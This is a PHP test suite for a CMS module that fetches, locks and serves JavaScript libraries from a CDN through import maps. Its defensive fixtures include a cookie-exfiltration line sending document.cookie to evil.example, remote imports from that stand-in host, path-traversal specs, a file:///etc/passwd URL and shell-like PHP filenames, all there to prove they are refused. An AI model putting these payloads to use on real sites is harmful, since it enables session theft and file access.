<?php

declare(strict_types=1);

namespace Cms\Modules\Site\Tests;

use Cms\Abilities\AbilityContext;
use Cms\Abilities\AbilityException;
use Cms\Modules\Site\Build\SiteBuilder;
use Cms\Modules\Site\Design\Code;
use Cms\Modules\Site\Design\Vendor;
use Cms\Modules\Site\Design\VendorFetcher;
use Cms\Modules\Site\Rendering\Renderer;
use Cms\Support\Files;
use Cms\Tests\TestCase;
use Illuminate\Support\Facades\Artisan;

/** Libraries in content/design/vendor: fetched once, locked, and imported by name through the import map. */
final class VendorTest extends TestCase
{
    private FakeVendorFetcher $cdn;

    protected function plugins(): array
    {
        return ['letterncms/blocks', 'letterncms/site'];
    }

    protected function collections(): array
    {
        return ['pages' => ['title' => 'Pages', 'route' => '/{slug}', 'body' => 'content', 'fields' => [['handle' => 'content', 'type' => 'blocks']]]];
    }

    protected function setUp(): void
    {
        parent::setUp();

        $this->cdn = new FakeVendorFetcher([
            'https://cdn.jsdelivr.net/npm/gsap@3.12.5/+esm' => "/** Bundled by jsDelivr */\nconst gsap={to(){}};export{gsap as default};\n//# sourceMappingURL=/sm/abc.map\n",
            'https://cdn.jsdelivr.net/npm/gsap@3.13.0/+esm' => "const gsap={to(){},v:2};export{gsap as default};\n",
            'https://registry.npmjs.org/gsap/latest' => '{"name":"gsap","version":"3.13.0"}',
            'https://cdn.jsdelivr.net/npm/three@0.160.0/+esm' => "export class Vector3{}\n",
            'https://cdn.jsdelivr.net/npm/three@0.160.0/examples/jsm/controls/OrbitControls.js/+esm' => 'import{Vector3 as u}from"/npm/three@0.160.0/+esm";import{h}from"/npm/three@0.160.0/examples/jsm/helper.js/+esm";export class OrbitControls{}'."\n",
            'https://cdn.jsdelivr.net/npm/three@0.160.0/examples/jsm/helper.js/+esm' => "export const h=1\n",
            'https://cdn.jsdelivr.net/npm/@scope/kit@1.0.0/+esm' => "export default 1\n",
            'https://cdn.jsdelivr.net/npm/evil@1.0.0/+esm' => 'import x from"https://evil.example/x.js";export default x'."\n",
            'https://cdn.jsdelivr.net/npm/html@1.0.0/+esm' => '<!doctype html><title>Not found</title>',
            'https://cdn.jsdelivr.net/npm/gh@1.0.0/+esm' => 'import x from"/gh/someone/repo@1.0.0/x.js";export default x'."\n",
            'https://cdn.jsdelivr.net/npm/dyn@1.0.0/+esm' => 'export default()=>import("//evil.example/x.js")'."\n",
            'https://cdn.jsdelivr.net/npm/lenis@1.1.13/dist/lenis.mjs/+esm' => "const from=Array.from('/abc');export default class Lenis{}\n//# sourceMappingURL=/sm/abc.map\n",
        ]);
        $this->app->instance(VendorFetcher::class, $this->cdn);
        $this->app->forgetInstance(Vendor::class);
        $this->app->forgetInstance(Code::class);
    }

    private function vendor(): Vendor
    {
        return $this->app->make(Vendor::class);
    }

    private function lock(): array
    {
        return Files::readJson(content_path('design/vendor/lock.json'))['imports'] ?? [];
    }

    public function test_add_keeps_the_build_and_locks_its_version_and_hash(): void
    {
        $result = $this->vendor()->add('gsap@3.12.5');

        $this->assertSame(['gsap'], $result['added']);
        $file = content_path('design/vendor/gsap@3.12.5/index.js');
        $this->assertSame("/** Bundled by jsDelivr */\nconst gsap={to(){}};export{gsap as default};\n", file_get_contents($file), 'without the source map it can’t have');
        $lock = $this->lock()['gsap'];
        $this->assertSame('3.12.5', $lock['version']);
        $this->assertSame('https://cdn.jsdelivr.net/npm/gsap@3.12.5/+esm', $lock['source']);
        $this->assertSame('sha384-'.base64_encode(hash_file('sha384', $file, true)), $lock['files']['gsap@3.12.5/index.js']);
    }

    public function test_a_version_is_exact_and_names_are_names(): void
    {
        foreach (['gsap', 'gsap@^3.12.0', 'gsap@latest', 'gsap@3', '../x@1.0.0', 'GSAP@1.0.0', 'a b@1.0.0', '@1.0.0'] as $spec) {
            try {
                $this->vendor()->add($spec);
                $this->fail("{$spec} was added");
            } catch (\InvalidArgumentException) {
                $this->addToAssertionCount(1);
            }
        }

        foreach ([['gsap@3.12.5', '../../../config/site.js', null], ['gsap@3.12.5', 'dist/.hidden.js', null], ['gsap@3.12.5', 'dist/x.php', null], ['gsap@3.12.5', null, '../x'], ['gsap@3.12.5', null, '/abs']] as [$spec, $file, $as]) {
            try {
                $this->vendor()->add($spec, $file, $as);
                $this->fail('added '.json_encode([$spec, $file, $as]));
            } catch (\InvalidArgumentException) {
                $this->addToAssertionCount(1);
            }
        }

        $this->assertSame([], $this->cdn->asked);
        $this->assertDirectoryDoesNotExist(content_path('design/vendor'));
    }

    public function test_what_a_build_imports_from_the_cdn_is_kept_too_and_a_package_is_shared_by_name(): void
    {
        $result = $this->vendor()->add('three@0.160.0', 'examples/jsm/controls/OrbitControls.js', 'three/addons/controls/OrbitControls.js');

        $this->assertSame(['three/addons/controls/OrbitControls.js', 'three'], $result['added']);
        $controls = (string) file_get_contents(content_path('design/vendor/three@0.160.0/examples/jsm/controls/OrbitControls.js'));
        $this->assertStringContainsString('from"three"', $controls, 'the package by its name: one copy for everything that imports it');
        $this->assertStringContainsString('from"../../../../three@0.160.0/examples/jsm/helper.js"', $controls, 'a file of it by its place');
        $this->assertStringNotContainsString('/npm/', $controls);
        $this->assertFileExists(content_path('design/vendor/three@0.160.0/examples/jsm/helper.js'));
        $this->assertFileExists(content_path('design/vendor/three@0.160.0/index.js'));
        $this->assertSame(['three'], $this->lock()['three/addons/controls/OrbitControls.js']['requires']);

        try {
            $this->vendor()->remove('three');
            $this->fail('removed what something imports');
        } catch (\InvalidArgumentException $e) {
            $this->assertStringContainsString('OrbitControls', $e->getMessage());
        }

        $this->vendor()->remove('three/addons/controls/OrbitControls.js');
        $this->assertFileDoesNotExist(content_path('design/vendor/three@0.160.0/examples/jsm/helper.js'));
        $this->assertFileExists(content_path('design/vendor/three@0.160.0/index.js'));
        $this->vendor()->remove('three');
        $this->assertDirectoryDoesNotExist(content_path('design/vendor'));
    }

    public function test_a_build_that_loads_from_another_server_or_is_no_script_is_refused(): void
    {
        foreach (['evil@1.0.0' => 'imports https://evil.example/x.js', 'gh@1.0.0' => 'imports /gh/someone/repo@1.0.0/x.js', 'dyn@1.0.0' => 'imports //evil.example/x.js', 'html@1.0.0' => 'not a JavaScript module', 'missing@1.0.0' => 'Nothing at'] as $spec => $message) {
            try {
                $this->vendor()->add($spec);
                $this->fail("{$spec} was added");
            } catch (\RuntimeException $e) {
                $this->assertStringContainsString($message, $e->getMessage());
            }
        }

        $this->assertSame([], $this->vendor()->all());
        $this->assertDirectoryDoesNotExist(content_path('design/vendor'), 'nothing of a refused build is kept');
    }

    public function test_files_are_kept_as_js_and_never_under_a_name_a_server_runs(): void
    {
        $this->vendor()->add('lenis@1.1.13', 'dist/lenis.mjs', 'lenis');

        $this->assertSame('lenis@1.1.13/dist/lenis.js', $this->vendor()->all()['lenis']['path']);
        $this->assertFileExists(content_path('design/vendor/lenis@1.1.13/dist/lenis.js'));
        $this->assertStringNotContainsString('sourceMappingURL', (string) file_get_contents(content_path('design/vendor/lenis@1.1.13/dist/lenis.js')));
        $this->assertSame('/_cms/site/vendor/lenis@1.1.13/dist/lenis.js', $this->vendor()->map()['imports']['lenis']);

        foreach ([['x@1.0.0', 'dist/shell.php.js', null], ['x@1.0.0', 'a.phtml/b.js', null], ['x.php@1.0.0', null, null], ['x@1.0.0', null, 'x/y.php.js']] as [$spec, $file, $as]) {
            try {
                $this->vendor()->add($spec, $file, $as);
                $this->fail('added '.json_encode([$spec, $file, $as]));
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString('a server runs', $e->getMessage());
            }
        }
    }

    public function test_the_fetcher_asks_only_the_cdn_and_the_registry(): void
    {
        $fetcher = new \Cms\Modules\Site\Design\HttpVendorFetcher;

        // Refused before anything is sent.
        foreach (['https://evil.example/npm/gsap@3.12.5/+esm', 'http://cdn.jsdelivr.net/npm/gsap@3.12.5/+esm', 'https://cdn.jsdelivr.net.evil.example/x', 'file:///etc/passwd'] as $url) {
            try {
                $fetcher->get($url);
                $this->fail("{$url} was asked");
            } catch (\RuntimeException $e) {
                $this->assertStringContainsString('only fetched from', $e->getMessage());
            }
        }
    }

    public function test_update_moves_to_the_newest_or_a_named_version_and_drops_the_old_files(): void
    {
        $this->vendor()->add('gsap@3.12.5');

        $this->vendor()->map();
        $this->assertFileExists(public_path('_cms/site/vendor/gsap@3.12.5/index.js'));

        $this->assertSame('3.13.0', $this->vendor()->update('gsap')['version']);
        $this->assertFileDoesNotExist(content_path('design/vendor/gsap@3.12.5/index.js'));
        $this->assertFileDoesNotExist(public_path('_cms/site/vendor/gsap@3.12.5/index.js'), 'the published copy goes with it');
        $this->assertFileExists(content_path('design/vendor/gsap@3.13.0/index.js'));

        $this->assertSame('3.12.5', $this->vendor()->update('gsap', '3.12.5')['version']);
        $this->assertSame(['gsap'], array_keys($this->vendor()->all()));

        $this->vendor()->map();
        $this->vendor()->remove('gsap');
        $this->assertDirectoryDoesNotExist(public_path('_cms/site/vendor'), 'a removed library is not left reachable');
    }

    public function test_pages_with_a_module_get_an_import_map_with_the_library_and_its_hash_and_nothing_remote(): void
    {
        $this->vendor()->add('gsap@3.12.5');
        $this->vendor()->add('@scope/kit@1.0.0');
        Files::put(content_path('design/scripts/hero.js'), "import gsap from 'gsap'\n");
        $this->app->make(Code::class)->flush();
        $render = fn (array $blocks, string $title) => $this->app->make(Renderer::class)->entry($this->cms()->entries()->find($this->cms()->content()->create('pages', ['title' => $title, 'status' => 'published', 'data' => ['content' => $blocks]])->id))['html'];

        $this->assertStringNotContainsString('importmap', $render([['type' => 'paragraph', 'props' => ['text' => 'Hi']]], 'Plain'), 'a page without a module carries nothing');

        $html = $render([['type' => 'box', 'code' => ['scripts' => ['hero']], 'children' => []]], 'Hero');
        $this->assertSame(1, preg_match('#<script type="importmap">(.+?)</script>#', $html, $m));
        $map = json_decode($m[1], true);
        $this->assertSame('/_cms/site/vendor/gsap@3.12.5/index.js', $map['imports']['gsap']);
        $this->assertSame('/_cms/site/vendor/@scope/kit@1.0.0/index.js', $map['imports']['@scope/kit']);
        $this->assertSame($this->lock()['gsap']['files']['gsap@3.12.5/index.js'], $map['integrity']['/_cms/site/vendor/gsap@3.12.5/index.js']);
        $this->assertFileEquals(content_path('design/vendor/gsap@3.12.5/index.js'), public_path('_cms/site/vendor/gsap@3.12.5/index.js'));
        $this->assertStringNotContainsString('jsdelivr', $html);
        $this->assertStringNotContainsString('http', $m[1]);
    }

    public function test_a_file_that_is_not_what_the_lock_says_is_not_published(): void
    {
        $this->vendor()->add('gsap@3.12.5');
        $this->assertArrayHasKey('gsap', $this->vendor()->map()['imports']);

        $this->travel(5)->seconds();
        file_put_contents(content_path('design/vendor/gsap@3.12.5/index.js'), "fetch('https://evil.example/'+document.cookie)\n");
        touch(content_path('design/vendor/gsap@3.12.5/index.js'), time() + 60);
        clearstatcache();
        $this->vendor()->flush();

        $warnings = [];
        $this->cms()->hooks()->on('render.warning', function (string $message) use (&$warnings) {
            $warnings[] = $message;
        });

        $this->assertSame([], $this->vendor()->map()['imports']);
        $this->assertFileDoesNotExist(public_path('_cms/site/vendor/gsap@3.12.5/index.js'));
        $this->assertStringContainsString('cms vendor add gsap@3.12.5', $warnings[0]);
    }

    public function test_a_lock_somebody_edited_can_not_name_files_outside(): void
    {
        Files::put(content_path('design/secret.js'), 'secret');
        Files::putJson(content_path('design/vendor/lock.json'), ['imports' => [
            'x' => ['package' => 'x', 'version' => '1.0.0', 'files' => ['x@1.0.0/index.js' => Vendor::hash('a'), '../secret.js' => Vendor::hash('secret')]],
            '../y' => ['package' => 'y', 'version' => '1.0.0', 'files' => ['y@1.0.0/index.js' => Vendor::hash('a')]],
            'z' => ['package' => '../z', 'version' => '1.0.0', 'files' => []],
        ]]);

        $this->assertSame(['x'], array_keys($this->vendor()->all()));
        $this->assertSame(['x@1.0.0/index.js'], array_keys($this->vendor()->all()['x']['files']));
    }

    public function test_adding_a_library_rebuilds_the_pages_with_an_import_map(): void
    {
        Files::put(content_path('design/scripts/hero.js'), "console.log(1)\n");
        $this->cms()->content()->create('pages', ['title' => 'With', 'status' => 'published', 'data' => ['content' => [['type' => 'box', 'code' => ['scripts' => ['hero']], 'children' => []]]]]);
        $this->cms()->content()->create('pages', ['title' => 'Without', 'status' => 'published', 'data' => ['content' => [['type' => 'paragraph', 'props' => ['text' => 'Hello']]]]]);
        $builder = $this->app->make(SiteBuilder::class);
        $builder->buildAll();
        $this->assertFalse($builder->hasWork());
        $built = fn (string $uri) => Files::readJson(storage_path('build/manifest.json'))['pages'][$uri]['builtAt'];
        [$with, $without] = [$built('/with'), $built('/without')];

        $this->travel(5)->seconds();
        $this->cms()->abilities()->execute('design/vendor-add', ['package' => 'gsap@3.12.5'], AbilityContext::system('test'));
        clearstatcache();

        $this->assertTrue($builder->hasWork());
        while ($builder->hasWork()) {
            $builder->process(10_000);
        }

        $this->assertNotSame($with, $built('/with'));
        $this->assertSame($without, $built('/without'));
        $this->assertStringContainsString('"gsap":"/_cms/site/vendor/gsap@3.12.5/index.js"', (string) file_get_contents(public_path('with/index.html')));
    }

    public function test_the_command_and_the_abilities_do_the_same(): void
    {
        $this->assertSame(0, Artisan::call('vendor', ['action' => 'add', 'package' => 'gsap@3.12.5']));
        $this->assertStringContainsString('import … from "gsap"', Artisan::output());
        $this->assertSame(0, Artisan::call('vendor'));
        $this->assertStringContainsString('gsap@3.12.5', Artisan::output());
        $this->assertSame(1, Artisan::call('vendor', ['action' => 'add', 'package' => 'gsap@^3']));
        $this->assertSame(0, Artisan::call('vendor', ['action' => 'update', 'package' => 'gsap']));
        $this->assertSame('3.13.0', $this->vendor()->all()['gsap']['version']);
        $this->assertSame(0, Artisan::call('vendor', ['action' => 'remove', 'package' => 'gsap']));
        $this->assertSame([], $this->vendor()->all());

        // With --json each answers one document, as every command does.
        $json = static function (array $params): array {
            $code = Artisan::call('vendor', [...$params, '--json' => true], $buffer = new \Symfony\Component\Console\Output\BufferedOutput);

            return [$code, json_decode($buffer->fetch(), true)];
        };
        [$code, $document] = $json(['action' => 'add', 'package' => 'gsap@3.12.5']);
        $this->assertSame(0, $code);
        $this->assertSame(['gsap'], $document['data']['added']);
        $this->assertSame('3.12.5', $document['data']['imports'][0]['version']);
        [, $document] = $json([]);
        $this->assertSame(['gsap'], array_column($document['data']['imports'], 'import'));
        [$code, $document] = $json(['action' => 'add', 'package' => 'gsap@^3']);
        $this->assertSame(1, $code);
        $this->assertSame('invalid_input', $document['error']['type']);
        [$code, $document] = $json(['action' => 'remove', 'package' => 'gsap']);
        $this->assertSame(0, $code);
        $this->assertSame(['removed' => 'gsap', 'imports' => []], $document['data']);

        $abilities = $this->cms()->abilities();
        $context = AbilityContext::system('test');
        $added = $abilities->execute('design/vendor-add', ['package' => 'three@0.160.0', 'file' => 'examples/jsm/controls/OrbitControls.js', 'as' => 'three/addons/controls/OrbitControls.js'], $context);
        $this->assertSame(['three', 'three/addons/controls/OrbitControls.js'], array_column($added['imports'], 'import'));
        $this->assertSame($added['imports'], $abilities->execute('design/vendor-list', [], $context)['imports']);
        $this->assertSame(['three'], array_column($abilities->execute('design/vendor-remove', ['import' => 'three/addons/controls/OrbitControls.js'], $context)['imports'], 'import'));

        try {
            $abilities->execute('design/vendor-add', ['package' => 'gsap@latest'], $context);
            $this->fail('a range was added');
        } catch (AbilityException $e) {
            $this->assertStringContainsString('exact version', $e->getMessage());
        }

        $this->expectException(AbilityException::class);
        $abilities->execute('design/vendor-add', ['package' => 'gsap@3.12.5'], AbilityContext::forUser($this->userWithRole('editor')));
    }
}
